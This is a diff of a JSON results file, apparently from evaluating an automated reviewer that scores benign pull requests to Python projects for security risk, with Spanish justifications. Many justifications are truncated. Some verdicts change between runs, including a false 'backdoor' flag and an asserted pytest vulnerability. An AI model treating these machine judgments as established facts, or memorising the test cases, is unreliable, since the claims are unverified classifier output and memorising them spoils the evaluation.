@@ -8,18 +8,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Se añaden nuevos casos de test para combinaciones de caracteres Unicode (incluyendo VS16 y ZWJ) en un fichero de tests, sin cambiar la lógica de la aplicación ni añadir dependencias o llamadas de red."
+    "justificacion": "El cambio añade casos de test unitarios para el manejo de caracteres de ancho cero y selectores de variación, lo que es una mejora rutinaria de la cobertura de pruebas sin modificar la lógica principal de la aplicación."
   },
   {
     "caso": "real_Textualize_rich_4026",
     "clase": "benign",
     "dificultad": "easy",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (1)",
-    "score": 1,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a añadir una línea de documentación referenciando una política sobre el uso de IA, sin afectar código ejecutable, dependencias, ni scripts de build."
+    "justificacion": "El cambio se limita a añadir una referencia a un fichero de política de IA en la documentación de CONTRIBUTING.md, sin modificar código ejecutable, dependencias o scripts de build."
   },
   {
     "caso": "real_encode_httpx_3667",
@@ -30,7 +30,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep y modificaciones puramente textuales en el README.md, sin afectar código ejecutable, dependencias o configuración del proyecto."
+    "justificacion": "Los cambios se limitan a actualizaciones de texto en el README.md y la eliminación de un fichero .gitkeep, sin introducir código ejecutable, modificaciones de dependencias o scripts de build."
   },
   {
     "caso": "real_encode_httpx_3692",
@@ -41,7 +41,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "La única modificación es una corrección de sintaxis (`report_file:` a `as report_file:`) en un bloque de código de ejemplo dentro de un fichero de documentación (.md), sin impacto en la lógica o ejecución de la aplicació"
+    "justificacion": "El cambio corrige un error de sintaxis menor ('as' missing en un 'with open') dentro de un bloque de código de ejemplo en un fichero de documentación, sin afectar la lógica del programa ni las dependencias."
   },
   {
     "caso": "real_encode_httpx_3703",
@@ -52,7 +52,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a corregir una errata ('equivelent' a 'equivalent') en un fichero de documentación (.md), sin ninguna línea de código ejecutable, dependencia ni configuración de build afectada."
+    "justificacion": "El cambio consiste en una corrección de errata ('equivelent' a 'equivalent') en un comentario dentro de un fichero de documentación Markdown, y la eliminación de un fichero de placeholder '.gitkeep_base'. Ninguno de los "
   },
   {
     "caso": "real_encode_httpx_3773",
@@ -63,7 +63,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a modificar una aserción en un test unitario para acomodar la detección de codificación de texto por parte de diferentes versiones de la librería 'chardet', sin introducir lógica nueva, llamadas de re"
+    "justificacion": "El cambio actualiza un test unitario para aceptar dos posibles detecciones de codificación ('ISO-8859-1' o 'WINDOWS-1252'), lo cual es una mejora para la robustez del test ante versiones de librerías de detección de enco"
   },
   {
     "caso": "real_pallets_click_3676",
@@ -74,7 +74,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una refactorización de los tests para `click.echo`, eliminando la necesidad de `StringIO` y la variable `isatty`, y utilizando `capfd` para capturar la salida. No introduce nueva lógica, dependencia"
+    "justificacion": "El cambio consiste en una refactorización de un fichero de test, eliminando el uso de `StringIO` y utilizando `capfd` de `pytest` de forma más consistente para capturar la salida de `click.echo`. No introduce nueva lógic"
   },
   {
     "caso": "real_pallets_click_3715",
@@ -85,10 +85,32 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una refactorización y ampliación de los tests de deprecación existentes en el módulo `tests/test_deprecations.py`, sin introducir lógica ejecutable de la aplicación, nuevas dependencias ni cambios a"
+    "justificacion": "El cambio consiste en la expansión y refactorización de tests unitarios para funcionalidades deprecadas dentro de la librería 'click', sin modificar lógica de aplicación, añadir dependencias externas, ni introducir llama"
   },
   {
     "caso": "real_pallets_flask_5487",
+    "clase": "benign",
+    "dificultad": "easy",
+    "esperado": "verde/amarillo (min. 0)",
+    "obtenido": "verde (1)",
+    "score": 1,
+    "cumple": "OK",
+    "categoria": "ninguna",
+    "justificacion": "El cambio renombra una variable ('name' a 'person') en un ejemplo de código dentro de la documentación, sin afectar la lógica, dependencias o configuración del proyecto."
+  },
+  {
+    "caso": "real_pallets_flask_5492",
+    "clase": "benign",
+    "dificultad": "easy",
+    "esperado": "verde/amarillo (min. 0)",
+    "obtenido": "verde (33)",
+    "score": 33,
+    "cumple": "OK",
+    "categoria": "ninguna",
+    "justificacion": "El diff consiste en actualizaciones rutinarias de versiones de paquetes de desarrollo (`pre-commit`, `pyright`, `pytest`). Sin embargo, la versión de `pytest` (8.2.1) es conocida por contener una vulnerabilidad (CVE-2025"
+  },
+  {
+    "caso": "real_pallets_flask_5962",
     "clase": "benign",
     "dificultad": "easy",
     "esperado": "verde/amarillo (min. 0)",
@@ -96,29 +118,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios consisten en un renombre consistente del parámetro 'name' a 'person' en un fichero de documentación, incluyendo los ejemplos de código y plantillas, sin introducir lógica nueva, dependencias ni llamadas a ser"
-  },
-  {
-    "caso": "real_pallets_flask_5492",
-    "clase": "benign",
-    "dificultad": "easy",
-    "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "amarillo (47)",
-    "score": 47,
-    "cumple": "OK",
-    "categoria": "escalada_privilegios",
-    "justificacion": "El cambio actualiza `pytest` de `8.2.0` a la versión `8.2.1` en `requirements/dev.txt`, `requirements/tests.txt` y `requirements/typing.txt`. Esta versión (`8.2.1`) está afectada por la vulnerabilidad conocida CVE-2025-7"
-  },
-  {
-    "caso": "real_pallets_flask_5962",
-    "clase": "benign",
-    "dificultad": "easy",
-    "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (7)",
-    "score": 7,
-    "cumple": "OK",
-    "categoria": "ninguna",
-    "justificacion": "El cambio elimina el test `test_environ_for_valid_idna_completes` de `tests/test_reqctx.py` que validaba el manejo de caracteres IDNA en el encabezado HTTP_HOST, lo cual podría reducir la cobertura de pruebas, pero no in"
+    "justificacion": "Se elimina un test unitario que comprueba la compatibilidad con IDNA y un fichero .gitkeep, sin introducir nueva lógica, llamadas de red ni cambios a scripts de build o dependencias."
   },
   {
     "caso": "real_pallets_flask_6095",
@@ -129,7 +129,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una refactorización y limpieza de los fixtures de pytest para el manejo de variables de entorno en los tests, reemplazando el uso de `monkeypatch._setitem.append` por `monkeypatch.delenv` y ajustand"
+    "justificacion": "Los cambios consisten en una refactorización de las fixtures de pytest para manejar las variables de entorno de `os.environ` de manera más explícita y segura en los tests, usando `monkeypatch.delenv` en lugar de métodos "
   },
   {
     "caso": "real_pallets_jinja_2063",
@@ -140,7 +140,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep y la adición de una nueva sección en un fichero de documentación (.rst) con un ejemplo de código, sin introducir lógica ejecutable ni alterar dependencias o scr"
+    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep y la adición de una sección de documentación con un bloque de código Python de ejemplo, sin alterar código ejecutable ni la configuración del proyecto."
   },
   {
     "caso": "real_pallets_jinja_2064",
@@ -151,7 +151,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una refactorización de la documentación sobre asignaciones de bloque en Jinja, incluyendo la reescritura de descripciones y el marcado explícito de ejemplos de código, sin afectar ninguna línea de c"
+    "justificacion": "El cambio se limita a la refactorización y aclaración de la documentación de plantillas Jinja en un fichero .rst, sin ninguna línea de código ejecutable, dependencia ni configuración afectada."
   },
   {
     "caso": "real_pallets_jinja_2070",
@@ -162,7 +162,7 @@
     "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación de un fichero de documentación local extenso (`CONTRIBUTING.rst`) y su reemplazo por una referencia en el `README.md` a un enlace externo que se asume legítimo (`palletsprojects.com`)"
+    "justificacion": "El cambio elimina las guías de contribución locales (CONTRIBUTING.rst) y las reemplaza con un enlace externo en README.md ('[contrib]: https://palletsprojects.com/contributing/'), lo que externaliza la documentación de c"
   },
   {
     "caso": "real_psf_requests_7576",
@@ -173,7 +173,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una corrección de ruta en un fichero de documentación (.github/CONTRIBUTING.md) y la eliminación de un fichero '.gitkeep_base', ambos son cambios de mantenimiento rutinarios sin impacto en la lógica"
+    "justificacion": "El cambio consiste en una corrección de la ruta relativa a absoluta de un fichero de política en la documentación, y la eliminación de un fichero .gitkeep, ambos son cambios rutinarios sin impacto en la seguridad."
   },
   {
     "caso": "real_pytest-dev_pytest_14804",
@@ -184,7 +184,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a una corrección de texto en un fichero de documentación (.rst), reemplazando 'Twitter' por 'social media', sin afectar ninguna línea de código ejecutable, dependencia o configuración."
+    "justificacion": "El cambio se limita a una corrección de texto en un fichero de documentación (.rst), reemplazando 'Twitter' por 'social media', sin afectar ninguna línea de código ejecutable, dependencias o configuración de build."
   },
   {
     "caso": "real_pytest-dev_pytest_14806",
@@ -195,7 +195,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio es una edición menor en un fichero de documentación (.rst) que reemplaza 'Twitter' por 'redes sociales', sin afectar a código ejecutable, dependencias o scripts de build."
+    "justificacion": "El cambio se limita a modificar una frase en un fichero de documentación (.rst), sin afectar ninguna línea de código ejecutable, dependencia ni configuración de build."
   },
   {
     "caso": "real_pytest-dev_pytest_14810",
@@ -206,7 +206,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en actualizar la documentación para reflejar el uso de pyproject.toml en lugar de setup.py para la definición de entry points de plugins, sin introducir código ejecutable, dependencias o cambios de con"
+    "justificacion": "El cambio consiste en una actualización de la documentación que sustituye el uso de `setup.py` por `pyproject.toml` para la configuración de plugins, incluyendo un cambio en un fichero de changelog y una actualización de"
   },
   {
     "caso": "real_pytest-dev_pytest_14831",
@@ -217,18 +217,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en actualizar la documentación para reflejar el paso de la configuración de plugins de `setup.py` a `pyproject.toml`, sin introducir código ejecutable, nuevas dependencias ni cambios en la configuració"
+    "justificacion": "El cambio consiste en una actualización de la documentación para reflejar la migración de la configuración de plugins de pytest desde setup.py a pyproject.toml, sin alterar código ejecutable ni añadir dependencias o scri"
   },
   {
     "caso": "real_pytest-dev_pytest_14836",
     "clase": "benign",
     "dificultad": "easy",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (1)",
-    "score": 1,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a la documentación de cómo obtener acceso de commit, sin tocar código ejecutable, dependencias o configuraciones de build."
+    "justificacion": "El cambio se limita a modificar el texto de la documentación sobre la política de acceso de commit, sin tocar código ejecutable, dependencias, ni scripts de build o CI."
   },
   {
     "caso": "real_Textualize_rich_4008",
@@ -239,7 +239,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de versión (de 14.3.2 a 14.3.3) para incluir una corrección de bug, reflejada consistentemente en el `CHANGELOG.md` (con enlace a PR) y `pyproject.toml`, sin ningún otro "
+    "justificacion": "El cambio consiste en una actualización rutinaria de la versión del paquete y la documentación del changelog para reflejar una corrección de bug, sin añadir nueva lógica, dependencias o ejecución de código externo. La el"
   },
   {
     "caso": "real_Textualize_rich_4073",
@@ -250,7 +250,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios se limitan a la actualización de la versión del paquete de '14.3.3' a '14.3.4' en `pyproject.toml` y a la adición de una nueva entrada en `CHANGELOG.md`, lo cual es una actualización rutinaria sin impacto en "
+    "justificacion": "El diff consiste en una actualización rutinaria de la versión del paquete (de 14.3.3 a 14.3.4) en pyproject.toml y la adición de entradas en el CHANGELOG.md, sin introducir cambios de código funcional, dependencias nueva"
   },
   {
     "caso": "real_Textualize_rich_4075",
@@ -261,7 +261,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación del soporte para Python 3.8, la corrección de un bug en el manejo del parámetro 'end' en llamadas print vacías, y la adición de un test unitario para verificar la corrección. No se ob"
+    "justificacion": "El cambio consiste en dejar de dar soporte a Python 3.8, acompañado de la corrección de un comportamiento menor en `console.print` para manejar el parámetro `end` en llamadas vacías, y un test unitario para la corrección"
   },
   {
     "caso": "real_Textualize_rich_4080",
@@ -272,7 +272,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de la versión del proyecto de 14.3.4 a 15.0.0, modificando el `CHANGELOG.md` y `pyproject.toml` sin introducir ningún código ejecutable, nuevas dependencias ni cambios en"
+    "justificacion": "El cambio consiste en una actualización rutinaria de la versión del proyecto de 14.3.4 a 15.0.0 en el `pyproject.toml` y el `CHANGELOG.md`, documentando un cambio disruptivo (eliminación del soporte para Python 3.9) con "
   },
   {
     "caso": "real_encode_httpx_3668",
@@ -283,7 +283,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a modificar las ramas que disparan el workflow de CI/CD para eventos de 'push' y 'pull_request' (de 'dev' a 'v1'), y la eliminación de un fichero .gitkeep, sin introducir lógica nueva, acceso a secret"
+    "justificacion": "El cambio se limita a modificar las ramas de GitHub Actions que disparan el workflow, pasando de 'dev' y 'version-*' a 'v1', y la eliminación de un fichero '.gitkeep', sin introducir nueva lógica, llamadas de red, o camb"
   },
   {
     "caso": "real_encode_httpx_3677",
@@ -294,18 +294,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la acción oficial 'actions/setup-python' de v5 a v6 en dos workflows, sin adición de pasos, alteración de permisos ni acceso a secretos -- un cambio sin implicaciones de seguridad aparen"
+    "justificacion": "Es una actualización rutinaria de la acción de GitHub 'actions/setup-python' de la versión 5 a la 6 en dos flujos de trabajo de CI/CD, sin añadir pasos nuevos, modificar permisos o acceder a secretos."
   },
   {
     "caso": "real_encode_httpx_3699",
     "clase": "benign",
     "dificultad": "hard",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (7)",
-    "score": 7,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en exponer 'FunctionAuth' al API público del módulo, lo cual se refleja consistentemente en el CHANGELOG y en las listas __all__ de httpx/__init__.py y httpx/_auth.py. No se introducen ficheros nuevos,"
+    "justificacion": "El cambio consiste en exponer una nueva clase `FunctionAuth` en la API pública, documentado en el changelog y reflejado en los `__all__` de los módulos correspondientes, sin añadir lógica de ejecución externa, cambios de"
   },
   {
     "caso": "real_encode_httpx_3730",
@@ -316,7 +316,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a eliminar una versión de Python de la matriz de pruebas en un workflow de GitHub Actions y eliminar un fichero .gitkeep, sin introducir nueva lógica, llamadas de red ni acceso a secretos."
+    "justificacion": "El cambio consiste en la eliminación de Python 3.10 del matrix de testing en un workflow de GitHub Actions, y la eliminación de un fichero .gitkeep_base, ambos son cambios rutinarios de mantenimiento sin intención malici"
   },
   {
     "caso": "real_pallets_click_3685",
@@ -327,7 +327,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste únicamente en modificar la extensión del fichero de cambios de 'CHANGES.rst' a 'CHANGES.md' en la configuración de inclusión de 'pyproject.toml', lo cual es una modificación rutinaria de formato de doc"
+    "justificacion": "El cambio consiste únicamente en modificar la extensión del fichero de cambios de '.rst' a '.md' en la lista 'include' de pyproject.toml, lo cual es un cambio puramente de formato sin impacto en la ejecución o seguridad "
   },
   {
     "caso": "real_pallets_click_3721",
@@ -338,7 +338,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en actualizaciones rutinarias de versiones de GitHub Actions en los workflows, pinneadas por SHA de commit completo, sin añadir pasos nuevos, modificar permisos o exfiltrar secretos. La eliminación del"
+    "justificacion": "Todas las modificaciones son actualizaciones rutinarias de versiones de GitHub Actions, pinneadas por SHA de commit completo (no un tag mutable) en los workflows, sin añadir pasos nuevos, modificar permisos o acceder a s"
   },
   {
     "caso": "real_pallets_flask_5493",
@@ -349,7 +349,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una action de terceros ('actions/checkout') en dos workflows, pinneada por SHA de commit completo (no un tag mutable), sin pasos, permisos ni acceso a secrets añadidos -- el mismo patrón"
+    "justificacion": "Es una actualización rutinaria de la acción 'actions/checkout' a la versión v4.1.6, pinneada por SHA de commit completo en ambos workflows, sin añadir pasos nuevos, alterar permisos o acceso a secretos."
   },
   {
     "caso": "real_pallets_flask_5924",
@@ -360,7 +360,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización de versión rutinaria (de '.dev' a la versión final '3.1.3') en pyproject.toml y uv.lock, junto con la actualización del registro de cambios CHANGES.rst que refleja esta liberación."
+    "justificacion": "El cambio consiste en una actualización rutinaria de la versión de desarrollo '3.1.3.dev' a la versión final '3.1.3' en los ficheros de configuración del proyecto (pyproject.toml) y el lock file (uv.lock), junto con la a"
   },
   {
     "caso": "real_pallets_flask_5945",
@@ -371,7 +371,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios consisten en la refactorización de permisos en los workflows de GitHub Actions para aplicar el principio de mínimo privilegio, la adición de 'concurrency' para gestionar ejecuciones y la incorporación de un n"
+    "justificacion": "Los cambios consisten en la refactorización de permisos para usar la granularidad por job (principio de mínimo privilegio), el endurecimiento de `actions/checkout` con `persist-credentials: false`, y la adición de un wor"
   },
   {
     "caso": "real_pallets_jinja_2097",
@@ -382,29 +382,29 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios se limitan a actualizaciones de versión de dependencias existentes (MarkupSafe y Babel) en pyproject.toml y uv.lock, sin añadir nuevas dependencias, scripts o funcionalidades que ejecuten código externo o man"
+    "justificacion": "El cambio consiste en una actualización rutinaria de dependencias (MarkupSafe y Babel) y la versión mínima de Python, reflejada consistentemente en pyproject.toml, uv.lock y CHANGES.rst, sin introducir código nuevo, llam"
   },
   {
     "caso": "real_pallets_jinja_2098",
     "clase": "benign",
     "dificultad": "hard",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "amarillo (47)",
-    "score": 47,
+    "obtenido": "verde (7)",
+    "score": 7,
     "cumple": "OK",
-    "categoria": "ofuscacion",
-    "justificacion": "El cambio en `src/jinja2/__init__.py` introduce una función `__getattr__` para el atributo `__version__` que, en lugar de devolver la versión de Jinja2, devuelve incorrectamente la versión de 'werkzeug' y emite una adver"
+    "categoria": "ninguna",
+    "justificacion": "El cambio en `src/jinja2/__init__.py` reemplaza el acceso directo a `__version__` con una función `__getattr__` que emite una advertencia de deprecación y, erróneamente, intenta obtener la versión de 'werkzeug' en lugar "
   },
   {
     "caso": "real_pallets_jinja_2105",
     "clase": "benign",
     "dificultad": "hard",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "amarillo (62)",
-    "score": 62,
-    "cumple": "OK",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "DIVERGE",
     "categoria": "backdoor",
-    "justificacion": "El cambio elimina completamente el job de 'provenance' que utilizaba 'slsa-framework/slsa-github-generator' y el paso que generaba hashes (con 'sha256sum') para los artefactos, lo que reduce significativamente la trazabi"
+    "justificacion": "El cambio elimina la generación de SLSA provenance para los artefactos de build, incluyendo la computación de hashes (`sha256sum`) y el uso del `slsa-github-generator`, lo que impide verificar la integridad de los artefa"
   },
   {
     "caso": "real_pallets_werkzeug_3167",
@@ -415,7 +415,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio refactoriza el código para usar la función `secrets.token_urlsafe` directamente para la generación de salts y secretos criptográficos, eliminando una implementación personalizada, lo cual es una mejora de segur"
+    "justificacion": "El cambio reemplaza el método de generación de salts personalizado (gen_salt) por la función segura secrets.token_urlsafe del módulo estándar de Python, lo cual es una mejora de seguridad y no introduce ninguna vulnerabi"
   },
   {
     "caso": "real_psf_black_5290",
@@ -426,7 +426,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Se actualiza una GitHub Action pinneada por SHA de commit completo a una versión más reciente, y se elimina un fichero '.gitkeep', ambos son cambios rutinarios sin impacto en la seguridad aparente."
+    "justificacion": "Se actualiza una acción de GitHub ('zizmorcore/zizmor-action') a una nueva versión, y el pin del SHA de commit completo se mantiene para la nueva versión, sin añadir nuevos pasos, permisos o acceso a secretos."
   },
   {
     "caso": "real_psf_black_5291",
@@ -437,7 +437,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una acción de terceros, pinneada por SHA de commit completo (no un tag mutable) en el workflow, sin pasos, permisos ni acceso a secrets añadidos -- el mismo patrón de pin seguro que ya u"
+    "justificacion": "Es una actualización rutinaria de una action de GitHub, pinneada por SHA de commit completo (no un tag mutable) en el workflow, sin pasos, permisos ni acceso a secrets añadidos -- el mismo patrón de pin seguro que ya usa"
   },
   {
     "caso": "real_psf_black_5292",
@@ -448,18 +448,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una acción de GitHub de terceros, pinneada por SHA de commit completo (no un tag mutable) en el workflow, sin pasos, permisos ni acceso a secrets añadidos más allá de la funcionalidad ex"
+    "justificacion": "Es una actualización rutinaria de una acción de GitHub de terceros, pinneada por SHA de commit completo (no un tag mutable) en el workflow, sin pasos nuevos, permisos ni acceso a secrets añadidos -- el mismo patrón de pi"
   },
   {
     "caso": "real_psf_black_5293",
     "clase": "benign",
     "dificultad": "hard",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "verde (7)",
+    "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio adapta el formato de la variable de entorno PIP_UPLOADED_PRIOR_TO a una fecha y hora explícitas ('2 days ago') mediante un comando de shell, en lugar de un valor relativo ('P2D'), lo que parece ser un ajuste de"
+    "justificacion": "El cambio adapta el filtro PIP_UPLOADED_PRIOR_TO para usar una fecha dinámica calculada en tiempo de ejecución en lugar de una duración estática, con un comentario que explica la necesidad de esta adaptación por versione"
   },
   {
     "caso": "real_psf_requests_7540",
@@ -470,7 +470,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la acción 'actions/checkout' de v6.0.2 a v7.0.0, pinneada por SHA de commit completo en todos los workflows, sin pasos, permisos ni acceso a secrets añadidos."
+    "justificacion": "El cambio consiste en una actualización rutinaria de la acción 'actions/checkout' a una nueva versión, pinneada por SHA de commit completo en todos los workflows, sin introducir nuevos pasos, modificar permisos ni accede"
   },
   {
     "caso": "real_psf_requests_7561",
@@ -481,7 +481,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una acción de terceros (actions/setup-python) a su versión 6.3.0, pinneada por SHA de commit completo (no un tag mutable) en los workflows, sin añadir pasos, permisos ni acceso a secrets"
+    "justificacion": "Es una actualización rutinaria de la acción 'actions/setup-python' de v6.2.0 a v6.3.0, pinneada por SHA de commit completo en los cuatro workflows, sin añadir pasos nuevos, permisos ni acceso a secrets."
   },
   {
     "caso": "real_psf_requests_7591",
@@ -492,7 +492,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de acciones oficiales de GitHub (CodeQL) pinneadas por SHA de commit completo (no un tag mutable) en el workflow de CI, sin añadir pasos, permisos ni acceso a secretos nuevos, siguiendo un "
+    "justificacion": "Es una actualización rutinaria de acciones oficiales de GitHub (CodeQL) en un workflow, pinneada por SHA de commit completo (no un tag mutable) en los tres usos, sin pasos, permisos ni acceso a secrets añadidos. También "
   },
   {
     "caso": "real_psf_requests_7596",
@@ -503,7 +503,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la actualización rutinaria de las acciones 'actions/setup-python' y 'zizmorcore/zizmor-action' en varios workflows de GitHub Actions. Todas las acciones se mantienen ancladas por SHA de commit compl"
+    "justificacion": "Es una actualización rutinaria de acciones de GitHub (`actions/setup-python` y `zizmorcore/zizmor-action`), pinneadas por SHA de commit completo (no un tag mutable) en todos los workflows, sin pasos, permisos ni acceso a"
   },
   {
     "caso": "real_pydantic_pydantic_13566",
@@ -514,7 +514,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una action de terceros ('pypa/gh-action-pypi-publish'), pinneada por SHA de commit completo (no un tag mutable), sin pasos, permisos ni acceso a secrets añadidos."
+    "justificacion": "Es una actualización rutinaria de una acción de GitHub oficial (pypa/gh-action-pypi-publish) a una versión de parche, pinneada por SHA de commit completo (no un tag mutable), sin cambios adicionales en el workflow, permi"
   },
   {
     "caso": "real_pydantic_pydantic_13567",
@@ -525,7 +525,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una acción de terceros, pinneada por SHA de commit completo (no un tag mutable), sin añadir pasos, permisos ni acceso a secrets -- el mismo patrón de pin seguro que ya usaba la versión a"
+    "justificacion": "Actualización rutinaria de la acción 'CodSpeedHQ/action' pinneada por SHA de commit completo, sin añadir pasos nuevos, ni tocar permisos o secretos, y manteniendo el mismo patrón seguro que ya usaba la versión anterior. "
   },
   {
     "caso": "real_pydantic_pydantic_13568",
@@ -547,7 +547,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una action de terceros ('actions/setup-python') de v6.3.0 a v7.0.0, pinneada por SHA de commit completo (no un tag mutable) en todos los workflows, sin pasos, permisos ni acceso a secret"
+    "justificacion": "Es una actualización rutinaria de la acción `actions/setup-python` de v6.3.0 a v7.0.0 en múltiples workflows, pinneada por SHA de commit completo, sin añadir pasos nuevos, tocar permisos o acceso a secretos."
   },
   {
     "caso": "real_pydantic_pydantic_13576",
@@ -558,7 +558,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en añadir `--no-install-package time-machine` al comando `uv sync` en el workflow de CI, lo que evita la instalación de dicho paquete, y la eliminación de un fichero `.gitkeep_base` -- ninguna de estas"
+    "justificacion": "El cambio consiste en añadir un paquete ('time-machine') a la lista de exclusión '--no-install-package' en un comando 'uv sync' de un workflow de CI, lo que restringe la instalación de esa dependencia en lugar de añadirl"
   },
   {
     "caso": "real_pytest-dev_pytest_14701",
@@ -569,7 +569,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización de la versión de Python en un workflow de CI, la eliminación de un fichero .gitkeep y un cambio cosmético en la representación de un carácter Unicode en un fichero de test. Ninguno"
+    "justificacion": "Los cambios consisten en una actualización menor de la versión de Python en un workflow de CI, la eliminación de un fichero .gitkeep y un cambio en la representación de un carácter Unicode dentro de una cadena en un test"
   },
   {
     "caso": "real_pytest-dev_pytest_14703",
@@ -580,7 +580,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios consisten en una actualización de la versión de Python en un workflow de CI/CD, la eliminación de un fichero .gitkeep y una modificación menor de una cadena Unicode en un fichero de test, sin introducir códig"
+    "justificacion": "El cambio consiste en una actualización menor de la versión de Python en un workflow de CI, la eliminación de un fichero .gitkeep (un archivo de marcador de posición) y un cambio de formato de escape en un literal de cad"
   },
   {
     "caso": "real_pytest-dev_pytest_14830",
@@ -591,7 +591,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Se actualiza el SHA de commit de una acción de GitHub Actions ('actions/stale') a una versión ligeramente posterior dentro de la misma versión semántica ('v10.1.0'), sin añadir nuevos pasos, modificar permisos o cambiar "
+    "justificacion": "Es una actualización rutinaria de una GitHub Action ('actions/stale'), pinneada por SHA de commit y sin cambios en los permisos configurados ni la adición de pasos nuevos. La eliminación de '.gitkeep_base' es un cambio c"
   },
   {
     "caso": "real_tqdm_tqdm_1782",
@@ -602,7 +602,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio de `pyproject.toml` a `include = [\"tqdm\", \"tqdm.*\"]` define explícitamente el contenido del paquete, lo cual, dado el campo 'homepage' del mismo fichero (`https://tqdm.github.io`), parece una definición legítim"
